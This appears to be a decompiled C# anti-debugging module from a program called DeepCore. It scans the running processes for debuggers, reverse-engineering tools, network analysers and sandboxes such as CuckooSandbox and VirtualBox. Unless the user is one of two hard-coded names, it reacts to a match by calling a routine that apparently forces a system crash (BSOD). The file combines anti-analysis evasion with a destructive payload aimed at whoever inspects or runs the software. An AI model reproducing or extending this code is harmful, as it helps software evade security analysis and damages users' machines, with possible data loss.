using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using DeepCore.Client.Misc;

namespace DeepCore.Protecc
{
	// Token: 0x02000008 RID: 8
	internal class BaseProtecc
	{
		// Token: 0x0600002C RID: 44
		[DllImport("kernel32.dll")]
		public static extern bool IsDebuggerPresent();

		// Token: 0x0600002D RID: 45 RVA: 0x00003204 File Offset: 0x00001404
		private static void Main()
		{
			if (BaseProtecc.IsDebuggerPresent())
			{
				BaseProtecc.HandleDebuggerDetection();
			}
			if (Debugger.IsAttached)
			{
				BaseProtecc.HandleDebuggerDetection();
			}
			if (BaseProtecc.IsDebuggerRunning())
			{
				BaseProtecc.HandleDebuggerDetection();
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000322C File Offset: 0x0000142C
		private static bool IsDebuggerRunning()
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				Process process = processes[i];
				if (BaseProtecc.DebuggerProcesses.Any((string debugger) => process.ProcessName.StartsWith(debugger, StringComparison.OrdinalIgnoreCase)))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003277 File Offset: 0x00001477
		private static void HandleDebuggerDetection()
		{
			if (Environment.UserName == "Biscuit" || Environment.UserName == "david")
			{
				WMessageBox.HandleInternalFailure("I found a debugger :3333", false);
				return;
			}
			WMessageBox.HandleInternalFailure("Goodbye :)", false);
			BSODTriggerThings.PCCrash();
		}

		// Token: 0x0400003A RID: 58
		private static readonly string[] DebuggerProcesses = new string[]
		{
			"dnSpy", "ollydbg", "x64dbg", "winDbg", "IDA Pro", "ImmunityDebugger", "ProcessHacker", "debugview", "Dbg64", "AspNetRegIIS",
			"windbg", "SharpDbg", "PEiD", "Fiddler", "procexp", "Procmon", "Frida", "Radare2", "JDbg", "Ghidra",
			"CFF Explorer", "Hopper", "Debugger", "AppVerifier", "WinDbgX", "bytecodeviewer", "Arachni", "BurpSuite", "Wireshark", "Tcpdump",
			"IronWASP", "OllyDbg", "x32dbg", "x64dbg", "Notepad++", "MTrace", "VeriCode", "VirtualBox", "CuckooSandbox", "Sandboxie",
			"VRTools", "GDB", "Valgrind", "FridaServer", "Ltrace", "Radare", "Hades", "Binary Ninja", "Z3"
		};
	}
}
